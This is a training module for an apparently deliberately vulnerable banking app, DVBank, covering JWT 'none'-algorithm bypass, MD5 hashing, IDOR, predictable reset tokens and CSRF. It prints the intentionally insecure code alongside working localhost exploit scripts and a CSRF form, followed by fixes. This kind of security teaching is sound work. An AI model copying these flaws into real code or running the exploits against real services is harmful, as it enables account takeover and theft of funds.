# Module 3: Authentication & Authorization Vulnerabilities

## Authentication vs Authorization
**Authentication** proves *who you are* (login, tokens). **Authorization** decides *what you may do* (ownership and role checks). Break authentication and you become any user; break authorization and you reach data or actions that aren't yours. DVBank breaks both. Below are the real bugs in this codebase — where they live, how to exploit them, and how to fix them.

## DVBank Authentication Vulnerabilities

### 1. JWT `none`-algorithm signature bypass (CWE-347)
**Location**: `backend/auth.py` — `_decode_token`
```python
def _decode_token(token):
    try:
        # Normal path: verify with the hardcoded HS256 secret
        return jwt.decode(token, 'secret', algorithms=['HS256'])
    except Exception:
        # INSECURE FALLBACK: accept unsigned / 'none'-algorithm tokens
        return jwt.decode(
            token,
            options={'verify_signature': False, 'verify_exp': False},
            algorithms=['HS256', 'none'],
        )
```
On *any* verification error the decoder re-parses the token **without checking the signature**, so an attacker never needs the secret. Both `@token_required` (Bearer header, `auth.py:32`) and `@cookie_auth` (session cookie, `auth.py:60`) route through this function, so the bypass affects every authenticated endpoint.

**Impact**: Forge a token for any `user_id` and impersonate that user — including the seeded admin account (`user_id=1`).

**Exploitation** (`docs/exploits/jwt_forge.py`): build an `alg:none` token with an empty signature and hit a real endpoint:
```python
import base64, json, urllib.request

def b64url(raw): return base64.urlsafe_b64encode(raw).rstrip(b'=').decode()

header  = {"alg": "none", "typ": "JWT"}
payload = {"user_id": 1, "username": "forged"}
# 'none' algorithm => empty third segment (trailing '.')
token = b64url(json.dumps(header).encode()) + "." + b64url(json.dumps(payload).encode()) + "."

req = urllib.request.Request("http://localhost:5000/api/me",
                             headers={"Authorization": f"Bearer {token}"})
print(urllib.request.urlopen(req).read().decode())   # returns user 1's account
```
> 🤔 **Challenge Note**: a JWT is `base64url(header).base64url(payload).signature`. For `alg:none` the third segment is empty, so the token ends in a trailing `.`. Why does the server accept a token with no signature at all?

### 2. Weak, hardcoded JWT secret (CWE-798)
**Location**: `backend/routes/auth_routes.py` — `login`
```python
token = jwt.encode(
    {
        'user_id': user[0],
        'username': username,
        'exp': datetime.utcnow() + timedelta(days=1)
    },
    'secret',            # hardcoded, shared, never rotated
    algorithm='HS256'
)
```
The token **does** carry a 1-day `exp` and a three-field payload, so the common "tokens never expire" claim is wrong here. The real problems are the hardcoded `'secret'` (anyone with the source can sign valid tokens) and no key rotation — and because of the `none`-algorithm fallback above, the signature and the secret are irrelevant to an attacker anyway.

**Impact**: Disclosure (or a guess) of `'secret'` lets an attacker mint valid HS256 tokens for any user.

### 3. Weak password hashing — unsalted MD5 (CWE-916)
**Location**: `backend/models.py`
```python
def set_password(self, password):
    self.password_hash = hashlib.md5(password.encode()).hexdigest()
```
Passwords are stored as a single unsalted MD5 — fast to brute-force and reversible via rainbow tables. Worse, the hashes leak: `GET /api/admin/users` (`backend/routes/admin_routes.py`) returns the raw `password_hash` for every user and has no role check (`@token_required` only), so **any** logged-in user can read them.

**Exploitation**:
```python
import requests
users = requests.get('http://localhost:5000/api/admin/users',
                     headers={'Authorization': f'Bearer {token}'}).json()
for u in users:
    print(u['username'], u['password_hash'])   # crack with: hashcat -m 0 (raw MD5)
```

## DVBank Authorization Vulnerabilities

### 1. Account takeover via `/api/update-password` (CWE-639 / CWE-640)
**Location**: `backend/routes/auth_routes.py`
```python
@auth_bp.route('/api/update-password', methods=['POST'])
@token_required
def update_password(current_user):
    data = request.get_json()
    user_id = data.get('user_id')        # taken from the body, NOT current_user
    new_password = data.get('new_password')
    user = User.query.get(user_id)
    if user:
        user.set_password(new_password)  # resets ANY user's password
        ...
```
The target `user_id` comes from the request body and is never compared to `current_user.id`. Any authenticated user can reset **any** account's password.

**Exploitation**:
```python
requests.post('http://localhost:5000/api/update-password',
              headers={'Authorization': f'Bearer {token}'},
              json={'user_id': 1, 'new_password': 'pwned'})   # take over user 1
```

### 2. IDOR in transaction access (CWE-639)
`/api/transactions/<id>` **does** check ownership and returns `403` (`transaction_routes.py:72`), so that route is *not* the bug. The real IDORs are:

- **Unauthenticated receipt page** — `backend/routes/transaction_routes.py`:
```python
@transaction_bp.route('/api/transactions/<int:transaction_id>/receipt', methods=['GET'])
def transaction_receipt(transaction_id):          # no @token_required, no owner check
    transaction = Transaction.query.get(transaction_id)
    ...
```
  With **no token at all**, anyone can enumerate receipt IDs and read every transaction's sender, receiver, amount and memo.

- **`user_id` trusted from the query string** — `get_transactions`:
```python
user_id = request.args.get('user_id', current_user.id)   # caller picks whose history
query = f'... WHERE sender_id = {user_id} OR receiver_id = {user_id} ...'
```
  Passing `?user_id=2` returns another user's history (and the unparameterised value is also a SQL-injection sink).

**Exploitation**:
```python
# No auth needed for receipts:
for tid in range(1, 100):
    r = requests.get(f'http://localhost:5000/api/transactions/{tid}/receipt')
    if r.ok: print(r.text)

# Read someone else's history:
requests.get('http://localhost:5000/api/transactions?user_id=2',
             headers={'Authorization': f'Bearer {token}'})
```

### 3. Insecure password reset — predictable token + host-header poisoning (CWE-330 / CWE-640 / CWE-644)
**Location**: `backend/routes/auth_routes.py` — `forgot_password`
```python
token = hashlib.md5(username.encode()).hexdigest()   # predictable: derived from the public username
...
host = request.headers.get('Host')                   # attacker-controlled
reset_link = f"http://{host}/reset-password?user={username}&token={token}"
```
The reset token is just `md5(username)`, so an attacker computes any user's token offline and calls `/api/reset-password` directly — no email, no expiry, no ownership proof. Separately, the reset link is built from the client-supplied `Host` header, so a poisoned `Host` plants an attacker-controlled link in any reset email.

**Exploitation**:
```python
import hashlib, requests
victim = 'alice'
token = hashlib.md5(victim.encode()).hexdigest()
requests.post('http://localhost:5000/api/reset-password',
              json={'username': victim, 'token': token, 'new_password': 'pwned'})
```

### 4. CSRF on the cookie-authenticated `/api/quickpay` (CWE-352)
**Location**: `backend/routes/transaction_routes.py` (`@cookie_auth`)
`login` mirrors the JWT into a `session_token` cookie set **without `SameSite`, `HttpOnly` or `Secure`** (`auth_routes.py:74`). `/api/quickpay` is authenticated by that ambient cookie alone, accepts a form-urlencoded body, and requires **no anti-CSRF token**, so a cross-site auto-submitting form moves money out of a logged-in victim's account:
```html
<form action="http://localhost:5000/api/quickpay" method="POST">
  <input name="to_user_id" value="2"><input name="amount" value="1000">
</form>
<script>document.forms[0].submit()</script>
```
> 💡 The missing `HttpOnly` flag also lets any XSS payload read `document.cookie` — chain it with the receipt-page XSS (Module 10).

## Prevention Methods

### 1. Verify JWTs strictly
```python
data = jwt.decode(
    token,
    os.getenv('JWT_SECRET'),   # strong secret from the environment, rotated
    algorithms=['HS256'],      # pin the algorithm — never accept 'none'
)                              # and NEVER fall back to verify_signature=False
```
Reject tokens that fail verification; do not re-decode them unverified.

### 2. Hash passwords with a slow, salted KDF
```python
from argon2 import PasswordHasher
ph = PasswordHasher()

def hash_password(password):
    return ph.hash(password)

def verify_password(hash, password):
    try:
        return ph.verify(hash, password)
    except Exception:
        return False
```
And never return `password_hash` in any API response.

### 3. Enforce ownership and roles on every resource
```python
@transaction_bp.route('/api/transactions/<int:transaction_id>', methods=['GET'])
@token_required
def get_transaction(current_user, transaction_id):
    txn = Transaction.query.get(transaction_id)
    if not txn or (txn.sender_id != current_user.id and txn.receiver_id != current_user.id):
        return jsonify({'error': 'Unauthorized'}), 403
    return jsonify(txn.to_dict())
```
Derive the acting user from the verified token (`current_user`), never from a body or query parameter, and gate admin routes on `current_user.role`.

## Practice Exercises
1. **Token forgery** — use `docs/exploits/jwt_forge.py` to mint an `alg:none` token and read `/api/me` as `user_id=1`; then pin the algorithm in `_decode_token` and confirm the forgery fails.
2. **Account takeover** — reset another user's password via `/api/update-password`, then fix the endpoint to act only on `current_user.id`.
3. **Authorization controls** — add ownership/role checks to the receipt route and `get_transactions`, and add a CSRF token plus `SameSite`/`HttpOnly` cookie flags to the QuickPay flow.

## Additional Resources
To deepen your understanding of authentication and authorization security:

1. [JWT Security Best Practices](https://auth0.com/blog/a-look-at-the-latest-draft-for-jwt-bcp/)
2. [OWASP Authentication Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
3. [OWASP Authorization Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)
4. [NIST Password Guidelines](https://pages.nist.gov/800-63-3/sp800-63b.html)
5. [JWT Attack Playbook](https://github.com/ticarpi/jwt_tool/wiki)
6. [Flask-JWT-Extended Documentation](https://flask-jwt-extended.readthedocs.io/en/stable/)
7. [Argon2 Password Hashing](https://argon2-cffi.readthedocs.io/en/stable/)
8. [OWASP Session Management Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
9. [OWASP Access Control Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Access_Control_Cheat_Sheet.html)
10. [CWE-287: Improper Authentication](https://cwe.mitre.org/data/definitions/287.html)
11. [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)

### Related Tools
1. [JWT.io](https://jwt.io/) - For JWT token analysis and debugging
2. [Burp Suite JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) - For JWT testing
3. [SQLMap](https://github.com/sqlmapproject/sqlmap) - For testing authentication bypass via SQL injection
4. [Hydra](https://github.com/vanhauser-thc/thc-hydra) - For password brute force testing

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments.
